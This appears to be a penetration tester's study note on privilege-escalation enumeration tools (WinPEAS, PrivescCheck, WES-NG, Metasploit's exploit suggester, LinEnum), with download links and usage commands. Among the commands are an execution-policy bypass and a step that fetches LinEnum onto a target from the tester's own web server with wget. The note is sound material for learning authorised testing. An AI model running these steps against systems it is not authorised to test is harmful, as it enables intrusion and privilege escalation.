### <mark style="background: #FF5582A6;">WinPEAS</mark>:

WinPEAS is a powerful enumeration tool designed to identify potential privilege escalation paths on a target system. It automates the execution of various commands to gather information. The output can be extensive, so it's recommended to redirect it to a file for easier analysis.

- **<mark style="background: #BBFABBA6;">Download WinPEAS</mark>:**
  [WinPEAS GitHub Repository](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

- **<mark style="background: #BBFABBA6;">Usage</mark>:**
  ```batch
  C:\> winpeas.exe > outputfile.txt
  ```

  The output file contains valuable information about the system, potential vulnerabilities, and paths for privilege escalation.

### <mark style="background: #FF5582A6;">PrivescCheck</mark>:

PrivescCheck is a PowerShell script that serves as an alternative to WinPEAS, providing similar functionality without the need for executing a binary file.

- **<mark style="background: #BBFABBA6;">Download PrivescCheck</mark>:**
  [PrivescCheck GitHub Repository](https://github.com/itm4n/PrivescCheck)

- **<mark style="background: #BBFABBA6;">Usage</mark>:**
  ```powershell
  PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
  PS C:\> . .\PrivescCheck.ps1
  PS C:\> Invoke-PrivescCheck
  ```

  PrivescCheck searches for common privilege escalation vectors and displays relevant information.

### <mark style="background: #FF5582A6;">WES-NG: Windows Exploit Suggester - Next Generation</mark>:

WES-NG is a Python script that assists in identifying missing patches on a target system, potentially leading to vulnerabilities that can be exploited for privilege escalation.

- **<mark style="background: #BBFABBA6;">Download WES-NG</mark>:**
  [WES-NG GitHub Repository](https://github.com/bitsadmin/wesng)

- **<mark style="background: #BBFABBA6;">Usage</mark>:**
  1. Update the database:
     ```bash
     user@kali$ wes.py --update
     ```
  2. Run the script with the systeminfo output file:
     ```bash
     user@kali$ wes.py systeminfo.txt
     ```

### <mark style="background: #FF5582A6;">Metasploit</mark>:

Metasploit, a powerful penetration testing framework, includes modules for local exploit suggestion. If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module.

- **<mark style="background: #BBFABBA6;">Metasploit</mark>:**
  [Metasploit Framework](https://www.metasploitunleashed.com/metasploit-unleashed.html)

- **<mark style="background: #BBFABBA6;">Meterpreter Local Exploit Suggester</mark>:**
  ```bash
  meterpreter > run post/multi/recon/local_exploit_suggester
  ```

  This Metasploit module identifies potential local vulnerabilities that could be exploited for privilege escalation.

### <mark style="background: #FF5582A6;">LinEnum</mark>**

**<mark style="background: #BBFABBA6;">Overview of LinEnum</mark>:**

LinEnum is a powerful bash script meticulously crafted to simplify the process of Linux privilege escalation. Tailored for Linux systems, LinEnum automates the execution of essential commands, presenting a detailed overview of potential vulnerabilities.

**<mark style="background: #BBFABBA6;">Obtaining LinEnum</mark>:**

- **Download Link:** LinEnum is available on its GitHub repository: [LinEnum GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

**<mark style="background: #BBFABBA6;">Transferring LinEnum to the Target Machine</mark>:**

1. **<mark style="background: #D2B3FFA6;">Using Python Web Server</mark>:**

   - Host LinEnum locally: Navigate to the LinEnum directory and initiate a Python web server: `python3 -m http.server 8000`.
   - On the target machine, retrieve LinEnum using `wget`: `wget http://your-local-ip:8000/LinEnum.sh`.
   - Ensure script execution permissions: `chmod +x LinEnum.sh`.

3. **<mark style="background: #D2B3FFA6;">Manual Copy Paste</mark>:**

   - Copy LinEnum code: Open LinEnum locally and copy its content.
   - On the target machine, create a new file using Vi or Nano: `vi LinEnum.sh` or `nano LinEnum.sh`.
   - Paste the copied code, save the file with the ".sh" extension, and grant execution permissions: `chmod +x LinEnum.sh`.

**<mark style="background: #BBFABBA6;">Running LinEnum</mark>:**

- Execute LinEnum as a bash script: `./LinEnum.sh`.